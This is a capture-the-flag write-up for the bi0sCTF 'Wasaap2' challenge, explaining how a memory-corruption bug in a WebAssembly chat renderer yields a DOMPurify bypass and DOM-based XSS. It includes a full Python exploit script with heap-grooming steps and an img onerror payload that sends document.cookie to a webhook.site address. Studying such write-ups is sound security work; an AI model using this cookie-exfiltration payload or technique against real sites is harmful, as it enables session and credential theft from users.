+++
title = "Wasaap2"
date = 2025-07-08
authors = ["Thirukailash"] 
+++


## Challenge Summary

The challenge presented a web-based chat interface with client-side WebAssembly (WASM) logic to handle message rendering and manipulation. Messages could be added, edited, and deleted, and each user’s state was serialized into a base64-encoded query string (`?s=...`). A bot visited user-generated states with a sensitive `Flag` cookie set.

The goal was to execute arbitrary JavaScript in the context of the bot to exfiltrate the `Flag` cookie.

---

## Vulnerability

The core issue was a memory corruption bug in the WASM module. By manipulating message creation and editing sequences, we achieved an **arbitrary read/write** primitive over the cached message structures in memory.

This allowed us to:

- Replace safe HTML tags (like `<div>`) with unsanitized tags (like `<xmp>`)
- Bypass DOMPurify's filtering and trigger a **DOM-based XSS**

---

## Exploit Strategy

1. **Heap Grooming**: Repeated `addmsg()` calls were used to layout memory and align controlled chunks.
2. **Structure Overlap**: A corrupted `cached_msg` object pointed into another, allowing us to overwrite tag names and bypass sanitization.
3. **XSS Payload Injection**: The `editmsg()` function placed a `<xmp><img onerror=...>` payload into the message content.
4. **Trigger Exfiltration**: The XSS sent `document.cookie` to a webhook.

---

## Exploit

``` Python
import os
import sys
import json
import base64
import urllib.parse
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--sync", action="store_true", help="Build and sync WASM module")
parser.add_argument("--admin", action="store_true", help="Launch with admin access")
parser.add_argument("--port", type=int, help="Target app port")
parser.add_argument("--xss", action="store_true", help="Enable XSS delivery mode")
parser.add_argument("--debug", action="store_true", help="Launch in debug browser mode")
args = parser.parse_args()

# Default port
port = args.port or 5501

browser = "/usr/bin/google-chrome-stable"
if args.xss:
    print("[+] XSS MODE ENABLED")
    browser = "/usr/bin/firefox"
if args.debug:
    print("[+] DEBUG MODE ENABLED")

if args.sync:
    print("[*] Building client...")
    os.system("./build.sh")
    sys.exit(0)

payload = []
message_ids = []
message_counter = 0

def add_message(content, timestamp=0):
    global message_counter
    idx = message_counter
    message_ids.append(idx)
    payload.append({
        "action": "add",
        "content": content,
        "time": timestamp
    })
    message_counter += 1
    return idx

def delete_message(index):
    if index in message_ids:
        message_ids.remove(index)
        payload.append({
            "action": "delete",
            "msgId": index
        })

def edit_message(index, new_content, timestamp=0):
    payload.append({
        "action": "edit",
        "msgId": index,
        "content": new_content,
        "time": timestamp
    })

# -------------------- Build Payload --------------------

# Heap grooming
allocated = [add_message("B" * 8) for _ in range(10)]
add_message("B" * 100)
[add_message(chr(0x61 + i)) for i in range(7)]
add_message("hello")
target_msg = add_message("A")

# Alignment padding
for i in range(11):
    if i == 8:
        # XSS vector placed here
        xss_payload = "<div id='</xmp><img src=x onerror=window.open(\"https://webhook.site/fbd4abde-676b-4222-8e33-64107fe95661/?flag=\"+document.cookie)>'></div>"
        add_message(xss_payload.ljust(146, "a"))
    else:
        add_message(f"block-{i + 20}")

# Trigger allocation to overwrite target
overlap_msg = add_message("zzz")

# Mutate HTML rendering internals
edit_message(18, chr(0x35))
edit_message(31, "xmp")
edit_message(18, chr(0x3f))
edit_message(31, "xmp")
edit_message(18, "aaaa" + chr(0x6c))
delete_message(31)

# -------------------- Encode Payload --------------------

encoded = json.dumps(payload, separators=(',', ':'))
print(f"[+] Raw JSON: {encoded}")

b64_payload = base64.b64encode(encoded.encode()).decode()
url_payload = urllib.parse.quote(b64_payload)

print(f"[+] Encoded payload: {url_payload}")

base_url = f"http://127.0.0.1:{port}/bot"
visit_url = f"{base_url}?visit={url_payload}" if args.admin else base_url

os.system(f"{browser} --new-tab \"{visit_url}\"")

```

---

## Final Payload Execution

The script sets up:

- `addmsg()` to fill up memory
- `editmsg()` to overwrite structure fields
- `delmsg()` to release memory
- Custom tag rewrites (`div` → `xmp`)

---

## Takeaways

This challenge demonstrated practical exploitation of:

- WebAssembly memory structure manipulation
- DOMPurify bypass through tag corruption
- Arbitrary read/write primitives in client-side VMs
- Real-world exploitation of serialization-based XSS

---

Huge thanks to **bi0sCTF** for this excellent challenge. It was a fun and insightful exercise into memory layout exploitation and browser-based attack surfaces.
